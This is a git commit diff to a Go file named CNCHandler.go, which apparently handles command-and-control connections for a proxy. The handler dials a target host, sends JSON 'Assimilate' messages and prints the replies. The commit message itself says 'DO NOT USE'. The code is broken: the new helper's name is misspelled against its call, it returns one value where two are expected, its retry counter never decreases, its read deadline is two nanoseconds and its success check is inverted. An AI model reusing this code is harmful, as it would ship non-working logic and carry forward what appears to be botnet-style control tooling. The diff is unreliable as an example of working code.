27cd0917482d6ac1788f6ce2ef6005f07007d047
javds <avrgdeer@gmail.com>
2025-04-02 20:51:38 -0700

    push back to Desktop DO NOT USE

--- networking/GOProxy/CNCHandler.go
+++ networking/GOProxy/CNCHandler.go
@@ -1,8 +1,10 @@
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
+	"log"
 	"net"
 	"sync"
 	"time"
@@ -12,15 +14,14 @@ func CNCHandler(wg *sync.WaitGroup, receiveClient chan AssimilateMessage, setup 
 	defer wg.Done() //signal main that you are done when function ends
 	println("Entered CNCHandler")
 
+	readAccumulator := new(bytes.Buffer)
+	readBuffer := make([]byte, 1024)
+
 	for {
-		fmt.Printf("Attempting to connect to %s...\n", setup.targetHost)
-		mergedTargetHost := setup.targetHost + ":" + fmt.Sprintf("%d", setup.port)
-		conn, err := net.DialTimeout("tcp", mergedTargetHost, setup.timeout*time.Second)
-		if err != nil {
-			fmt.Printf("CNCHANDLER:Failed to connect: %v\n", err)
-			fmt.Printf("CNCHANDLER:Retrying in %s...\n", setup.retryDelay)
-			time.Sleep(setup.retryDelay)
-			continue // Go to the next iteration of the loop to retry
+		conn, connStatus := AssimilateTCPConnect(setup)
+		if connStatus {
+			//if the connection has failed return and stop
+			return
 		}
 
 		//make message to send
@@ -41,8 +42,40 @@ func CNCHandler(wg *sync.WaitGroup, receiveClient chan AssimilateMessage, setup 
 
 			conn.Write(jsonData)
 			time.Sleep(5 * time.Second)
+			conn.Read(readBuffer)
+			println(readBuffer)
 		}
 	}
 
 	return
+}
+
+func AsimilateTCPConnect(setup CNCFuncSetup) bool {
+
+	retryCounter := setup.retryCount
+
+	for {
+		fmt.Printf("Attempting to connect to %s...\n", setup.targetHost)
+		mergedTargetHost := setup.targetHost + ":" + fmt.Sprintf("%d", setup.port)
+		conn, err := net.DialTimeout("tcp", mergedTargetHost, setup.timeout*time.Second)
+
+		if retryCounter <= 0 {
+			return false
+		}
+
+		if err != nil {
+			fmt.Printf("CNCHANDLER:Failed to connect: %v\n", err)
+			fmt.Printf("CNCHANDLER:Retrying in %s...\n", setup.retryDelay)
+			time.Sleep(setup.retryDelay)
+			continue // Go to the next iteration of the loop to retry
+		}
+
+		err = conn.SetReadDeadline(time.Now().Add(2 * time.Nanosecond))
+		if err != nil {
+			log.Println("Error setting read deadline:", err)
+			continue
+		}
+
+		return true
+	}
 }
